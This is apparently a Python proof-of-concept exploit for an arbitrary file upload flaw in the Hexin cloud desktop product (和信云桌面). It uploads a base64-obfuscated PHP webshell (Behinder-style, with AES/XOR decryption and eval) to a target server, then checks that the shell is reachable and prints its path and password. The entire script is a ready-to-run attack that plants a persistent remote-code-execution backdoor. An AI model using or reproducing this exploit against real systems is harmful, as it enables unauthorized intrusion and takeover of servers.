import requests
import sys
import random
import base64
import re
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
    print('+  \033[34mVersion: 和信云桌面任意文件上传漏洞                                       \033[0m')
    print('+  \033[36m使用格式:  python3 poc.py                                            \033[0m')
    print('+  \033[36mUrl         >>> http://xxx.xxx.xxx.xxx                             \033[0m')
    print('+  \033[36mCmd         >>> whoami                                            \033[0m')
    print('+------------------------------------------')

def POC_1(target_url):
    vuln_url = target_url + "/Upload/upload_file.php?l=test"
    headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)",
            "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryfcKRltGv"
    }
    data = base64.b64decode("Q29udGVudC1UeXBlOiBtdWx0aXBhcnQvZm9ybS1kYXRhOyBib3VuZGFyeT0tLS0tV2ViS2l0Rm9ybUJvdW5kYXJ5ZmNLUmx0R3YKCi0tLS0tLVdlYktpdEZvcm1Cb3VuZGFyeWZjS1JsdEd2CkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT0iZmlsZSI7IGZpbGVuYW1lPSJjb25maWcucGhwIgpDb250ZW50LVR5cGU6IGltYWdlL2F2aWYKCjw/cGhwCkBlcnJvcl9yZXBvcnRpbmcoMCk7CnNlc3Npb25fc3RhcnQoKTsKCWVjaG8gIm5vX3NoZWxsIjsKICAgICRrZXk9ImVkZjZiZDVjYzAwYmJjNzYiOwoJJF9TRVNTSU9OWydrJ109JGtleTsKCSRwb3N0PWZpbGVfZ2V0X2NvbnRlbnRzKCJwaHA6Ly9pbnB1dCIpOwoJaWYoIWV4dGVuc2lvbl9sb2FkZWQoJ29wZW5zc2wnKSkKCXsKCQkkdD0iYmFzZTY0XyIuImRlY29kZSI7CgkJJHBvc3Q9JHQoJHBvc3QuIiIpOwoJCQoJCWZvcigkaT0wOyRpPHN0cmxlbigkcG9zdCk7JGkrKykgewogICAgCQkJICRwb3N0WyRpXSA9ICRwb3N0WyRpXV4ka2V5WyRpKzEmMTVdOyAKICAgIAkJCX0KCX0KCWVsc2UKCXsKCQkkcG9zdD1vcGVuc3NsX2RlY3J5cHQoJHBvc3QsICJBRVMxMjgiLCAka2V5KTsKCX0KICAgICRhcnI9ZXhwbG9kZSgnfCcsJHBvc3QpOwogICAgJGZ1bmM9JGFyclswXTsKICAgICRwYXJhbXM9JGFyclsxXTsKCWNsYXNzIEN7cHVibGljIGZ1bmN0aW9uIF9faW52b2tlKCRwKSB7ZXZhbCgkcC4iIik7fX0KICAgIEBjYWxsX3VzZXJfZnVuYyhuZXcgQygpLCRwYXJhbXMpOwo/PgoKLS0tLS0tV2ViS2l0Rm9ybUJvdW5kYXJ5ZmNLUmx0R3YtLQ==")
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5)
        if "Requst" in response.text and response.status_code == 200:
            webshell_url = target_url + "/Upload/test/config.php"
            response = requests.get(url=webshell_url, headers=headers,verify=False, timeout=5)
            if "shell" in response.text and response.status_code == 200:
                print("\033[32m[o] 目标 {}存在漏洞 ,成功上传冰蝎木马 config.php\n[o] 路径为 {}/Upload/test/config.php\033[0m".format(target_url, target_url))
                print("\033[32m[o] 密码为: PeiQi_webshell \033[0m")
            else:
                print("\033[31m[x] 请求失败 \033[0m")
                sys.exit(0)
        else:
            print("\033[31m[x] 上传失败 \033[0m")
    except Exception as e:
        print("\033[31m[x] 请求失败 \033[0m", e)


if __name__ == '__main__':
    title()
    target_url = str(input("\033[35mPlease input Attack Url\nUrl >>> \033[0m"))
    POC_1(target_url)
